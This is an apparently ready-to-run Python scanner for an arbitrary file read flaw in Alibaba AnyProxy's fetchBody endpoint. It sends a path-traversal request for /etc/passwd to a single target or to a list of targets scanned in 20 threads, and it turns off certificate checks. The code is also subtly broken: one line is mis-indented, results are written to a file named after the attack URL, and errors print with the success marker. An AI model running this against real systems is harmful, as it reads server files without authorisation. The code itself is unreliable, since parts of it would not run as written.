# -*- coding: utf-8 -*-
import argparse
import requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.6"
}


def banner():
    test = """

           _ _ _           _                                  _____                        __     _       _     ____            _        
     /\   | (_) |         | |               /\               |  __ \                      / _|   | |     | |   |  _ \          | |       
    /  \  | |_| |__   __ _| |__   __ _     /  \   _ __  _   _| |__) | __ _____  ___   _  | |_ ___| |_ ___| |__ | |_) | ___   __| |_   _  
   / /\ \ | | | '_ \ / _` | '_ \ / _` |   / /\ \ | '_ \| | | |  ___/ '__/ _ \ \/ / | | | |  _/ _ \ __/ __| '_ \|  _ < / _ \ / _` | | | | 
  / ____ \| | | |_) | (_| | |_) | (_| |  / ____ \| | | | |_| | |   | | | (_) >  <| |_| | | ||  __/ || (__| | | | |_) | (_) | (_| | |_| | 
 /_/    \_\_|_|_.__/ \__,_|_.__/ \__,_| /_/    \_\_| |_|\__, |_|   |_|  \___/_/\_\\__, | |_| \___|\__\___|_| |_|____/ \___/ \__,_|\__, | 
                                                         __/ |                     __/ |                                           __/ | 
                                                        |___/                     |___/                                           |___                       
                                            tag:  Alibaba AnyProxy fetchBody 任意文件读取漏洞 poc                                       
                                                     @version: 1.0.0   @author: zl                                                                    


 """
    print(test)


def poc(target):
      url = target + "/fetchBody?id=1/../../../../../../../../etc/passwd"
    try:
        res = requests.get(url, headers=headers, verify=False, timeout=5)
        if res.status_code == 200:
            result = "[+]{} is vulnerable".format(target)
            print(result)
            with open("{}".format(url), "a") as f:
                f.write(result + "\n")
        else:
            result = "[-]{} is not vulnerable".format(target)
            print(result)
            print()
    except:
        print(f"[+] {target} error")
        return False


def main():
    parser = argparse.ArgumentParser(description='Alibaba AnyProxy fetchBody 任意文件读取漏洞')
    parser.add_argument("-u", "--url", dest="url", type=str, help="example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with (open(args.file, "r", encoding="utf-8") as file):
            for url in file:
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(20)  # 20自己指定的线程数
        mp.map(poc, url_list)  # printNumber 函数 target 目标列表
        mp.close()
        mp.join()
    else:
        parser.print_help()


if __name__ == "__main__":
    banner()
    main()
